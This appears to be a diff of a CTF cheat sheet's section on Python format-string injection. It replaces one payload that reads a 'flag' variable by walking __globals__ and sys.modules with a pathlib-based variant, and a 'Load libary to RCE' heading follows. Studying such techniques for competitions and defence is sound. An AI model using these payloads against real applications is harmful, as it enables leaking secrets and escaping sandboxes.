@@ -3,7 +3,11 @@
 ## format string
 
 ### Read var
-`{0.__init__.__globals__[__builtins__][quit].__init__.__globals__[sys].modules[flag].flag}`
+```
+import pathlib
+a = pathlib.Path.cwd()
+print("{a.unlink.__globals__[sys].modules[flag].flag}".format(a=a))
+```
 
 ### Load libary to RCE
 
